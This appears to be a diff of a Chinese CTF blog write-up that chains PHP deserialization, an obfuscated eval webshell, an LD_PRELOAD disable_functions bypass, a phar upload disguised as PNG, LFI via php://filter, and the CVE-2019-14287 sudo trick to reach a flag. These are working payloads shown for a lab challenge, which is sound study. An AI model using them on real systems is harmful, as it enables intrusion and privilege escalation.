@@ -99,7 +99,7 @@
 <p>打开这道题首先就是一堆 PHP 源码，直接就摆上了一大堆 <code>class</code> ，先暂时略过这些 <code>class</code> ，继续向下看，我们会发现在源码的末尾有这么一段</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -108,7 +108,7 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'p'</span><span class="p">];</span>
 <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
 <span class="k">if</span><span class="p">(</span><span class="nv">$flag</span> <span class="o">===</span> <span class="mi">1</span><span class="p">){</span>
@@ -120,10 +120,10 @@
 </div><p>结合上边的一大堆 <code>class</code> ，考虑利用反序列化漏洞，层层递进，最终将变量 <code>flag</code> 的值设为 <code>1</code> 即可，故构造以下 payload （这里可以直接复制粘贴，然后自己写一个脚本把需要的变量序列化一下即可）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?p=O:4:"Deep":2:{s:2:"m1";O:4:"Dark":2:{s:2:"m1";O:7:"Fantasy":2:{s:2:"m1";O:5:"Happy":2:{s:2:"m1";O:8:"New_year":2:{s:2:"s1";O:21:"Copied_from_somewhere":0:{}s:2:"s2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/?p=O:4:"Deep":2:{s:2:"m1";O:4:"Dark":2:{s:2:"m1";O:7:"Fantasy":2:{s:2:"m1";O:5:"Happy":2:{s:2:"m1";O:8:"New_year":2:{s:2:"s1";O:21:"Copied_from_somewhere":0:{}s:2:"s2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}s:2:"m2";N;}
 </code></pre></td></tr></table>
 </div>
 </div><p>输入后发现在未提供参数 <code>c</code> 的情况下输出了 <code>?</code> ，可知成功将 <code>flag</code> 设为 <code>1</code></p>
@@ -131,7 +131,7 @@
 <p>之后查看最后的一段源码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -146,7 +146,7 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre class="chroma" tabindex="0"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
     <span class="k">die</span><span class="p">(</span><span class="s2">"?"</span><span class="p">);</span>
 <span class="p">}</span>
@@ -166,10 +166,10 @@
 然后我们非常高兴的执行了 <code>system('whoami')</code> ，但是，什么都没有发生，看一下 <code>phpinfo()</code> ，发现几乎所有能拿到系统shell的函数都在 <code>disable_functions</code> 里，然后考虑绕过 <code>disable_functions</code> 的方法，经过多方查找，最后选择了通过 <code>LD_PRELOAD</code> 的方式绕过，但这种方法需要上传文件，所以继续构造 payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?p=O:4:%22Deep%22:2:{s:2:%22m1%22;O:4:%22Dark%22:2:{s:2:%22m1%22;O:7:%22Fantasy%22:2:{s:2:%22m1%22;O:5:%22Happy%22:2:{s:2:%22m1%22;O:8:%22New_year%22:2:{s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:{}s:2:%22s2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}&amp;c=(~%9e%8c%8c%9a%8d%8b)(${~%a0%b8%ba%ab}[%aa]);&amp;%aa=eval($_POST['aaa']);
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/?p=O:4:%22Deep%22:2:{s:2:%22m1%22;O:4:%22Dark%22:2:{s:2:%22m1%22;O:7:%22Fantasy%22:2:{s:2:%22m1%22;O:5:%22Happy%22:2:{s:2:%22m1%22;O:8:%22New_year%22:2:{s:2:%22s1%22;O:21:%22Copied_from_somewhere%22:0:{}s:2:%22s2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}s:2:%22m2%22;N;}&amp;c=(~%9e%8c%8c%9a%8d%8b)(${~%a0%b8%ba%ab}[%aa]);&amp;%aa=eval($_POST['aaa']);
 </code></pre></td></tr></table>
 </div>
 </div><p>这里我们采用另一个可以执行 PHP 语句的函数 <code>assert</code> ，但由于 <code>assert</code> 一次只能执行一条语句，我们可以在其中再加入一个 <code>eval</code> ，这里便出现了我们熟悉的一句话木马，二话不说扔到蚁剑里，发现 shell 依然无法使用，但可以读取和上传文件（这里是因为读取和上传文件可以用 PHP 自带的其它函数实现，所以不需要拿到 shell 就可以），由于 hint 告诉我们对 <code>html</code> 目录没有写权限，故考虑另一个目录 <code>/tmp</code> ，测试后发现有写权限，故可以上传构造的 <code>so</code> 文件进行进一步操作（但当时服务器里有不知哪位好心的大哥留下的 <code>so</code> 文件，我就直接拿来用了，后来知道那个文件<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" rel="noopener noreffer" target="_blank">出自此处</a>，这个构造的十分巧妙，使用了另一个环境变量，配合 PHP 实现一次编译即可执行任意命令，无需每次修改命令都要重新编译，学到了)，然后 <code>include</code> 一下配套的 PHP 文件，按照 PHP 里的参数配置一下，成功拿到系统shell</p>
@@ -177,10 +177,10 @@
 <p>由于 hint 给出了 <code>LAN &amp; ARP</code> ，这里考虑 flag 可能存在于另一台服务器（记为服务器2）上，用 <code>arp -a</code> 看一下，发现有这么一个 IP 与众不同</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">getmeinside_inner_1.getmeinside_lan (172.16.233.233) at 02:42:ac:10:e9:e9 [ether] on eth0
 </code></pre></td></tr></table>
 </div>
 </div><p><code>curl</code> 看一下，发现有一个网页可以上传文件，考虑将服务器2的80端口转发出来，可以采用 msf 的 <code>meterpreter</code> 模块（这里需要自己有一个公网 IP ，我选择开了一个 VPS ，一般来说再将 VPS 端口转发到本地比较安全，但我为了方便直接在 VPS 上装了个 msf ，毕竟用完即删）
@@ -189,20 +189,20 @@
 <p>打开页面，发现似乎可以上传什么东西，观察 url 有 <code>/?file=index</code> ，点击上传后 url 变化但页面并未变化，尝试去掉最后的 <code>.php</code> ，发现成功打开上传页面，可以判断 <code>file</code> 是一个 <code>include</code> 漏洞，尝试 <code>php伪协议</code> 读取源码，构造以下 payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?file=php://filter/read=convert.base64-encode/resource=upload
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/?file=php://filter/read=convert.base64-encode/resource=upload
 </code></pre></td></tr></table>
 </div>
 </div><p>成功读到 <code>upload.php</code> 的源码（我第一次做的时候的确读到了源码，但再次尝试却发现读不到了QAQ）
 观察上传页面，发现并无表单可以提交，就在本地写一个表单提交到服务器2，尝试发现只能上传 png 文件，由于 hint 指出了 <code>Phar</code> ，于是写一个一句话木马，打包成 <code>zip</code>（注意打包时选择不压缩），然后将拓展名改为 <code>png</code> ，成功上传，得到上传后的文件名，构造以下 payload（注意最后的木马名不需要 <code>.php</code>)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">/?file=phar://pic/文件名/木马名
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">/?file=phar://pic/文件名/木马名
 </code></pre></td></tr></table>
 </div>
 </div><p>看一下 <code>phpinfo</code> ，发现拿 shell 的函数并没有被禁用，直接拿到系统shell（这里我想再扔到蚁剑里，但莫名其妙连不上，就手动操作了）</p>
@@ -210,20 +210,20 @@
 <p>根据 hint ，只有 root 用户可以读取 flag 文件，尝试 <code>sudo cat</code>，发现并不能读取，<code>sudo -l</code> 看一下权限，发现权限设置如下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">(ALL,!root) NOPASSWD:/bin/cat
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">(ALL,!root) NOPASSWD:/bin/cat
 </code></pre></td></tr></table>
 </div>
 </div><p>直接使用 <code>sudo</code> 无法使用 <code>cat</code> ，这里我探索了接近两小时终于搜到了一个神奇的漏洞 <code>CVE-2019-14287</code> ，漏洞具体信息可以参考我好不容易搜到的的<a href="https://www.agesec.com/8369.html" rel="noopener noreffer" target="_blank">这个网站</a>
 根据这个漏洞执行以下命令</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u#-1 /bin/cat /flag
+<pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash">sudo -u#-1 /bin/cat /flag
 </code></pre></td></tr></table>
 </div>
 </div><p>成功获得 flag！！！（泪目）</p>
@@ -257,7 +257,7 @@
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
 </main><footer class="footer">
-<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.85.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
 </div>
 </footer></div>
